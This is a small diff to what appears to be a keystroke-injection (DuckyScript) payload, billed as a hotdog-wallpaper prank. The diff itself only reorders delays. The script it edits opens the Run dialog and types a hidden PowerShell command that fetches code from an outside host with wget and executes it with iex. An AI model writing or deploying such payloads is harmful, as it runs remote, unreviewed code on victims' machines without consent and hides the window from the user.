@@ -1,6 +1,6 @@
 REM Set desktop background to image of hotdogs :)
-DELAY 1000
-GUI r
 DELAY 2000
+GUI r
+DELAY 1000
 STRING powershell -windowstyle hidden iex (wget https://judge.sh/wallpaper.php?image=http://s3.amazonaws.com/rapgenius/hotdog.jpg)
 ENTER
